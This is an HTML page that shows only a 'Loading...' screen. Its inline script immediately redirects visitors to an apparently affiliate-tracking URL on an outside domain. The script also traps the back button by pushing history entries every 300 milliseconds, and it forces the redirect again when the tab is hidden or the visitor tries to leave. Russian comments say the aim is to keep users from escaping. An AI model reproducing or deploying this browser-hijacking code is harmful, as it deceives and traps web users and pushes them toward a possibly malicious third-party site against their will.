<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <title>Attention!</title>
  <link rel="icon" href="fav.png" />
  <script type="text/javascript">
    const redirectUrl = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';

    function forceRedirect() {
      // Пробуем остановить текущую загрузку и сразу редирект
      try { window.stop(); } catch (e) {}
      window.location.replace(redirectUrl);
    }

    function trapHistory() {
      history.pushState({}, '', window.location.href);
    }

    document.addEventListener('DOMContentLoaded', () => {
      // Мгновенный редирект при открытии
      forceRedirect();

      trapHistory();

      window.onpopstate = () => {
        forceRedirect();
      };

      // Повторяем ловушку, чтобы не успели "выскочить"
      setInterval(trapHistory, 300);

      // Если страница теряет фокус (крестик, назад, сворачивание) — сразу редирект
      document.addEventListener('visibilitychange', () => {
        if (document.visibilityState === 'hidden') {
          forceRedirect();
        }
      });

      // Перехватываем попытки закрытия прямо перед уходом
      window.addEventListener('beforeunload', () => {
        forceRedirect();
      });
    });
  </script>
</head>

<body>
  <style>
    .pl763847__wrap {
      position: fixed;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #FFFFFF;
      font-family: "Roboto", sans-serif;
      font-size: 36px;
    }
  </style>

  <div class="pl763847__wrap">
    Loading...
  </div>
</body>
</html>
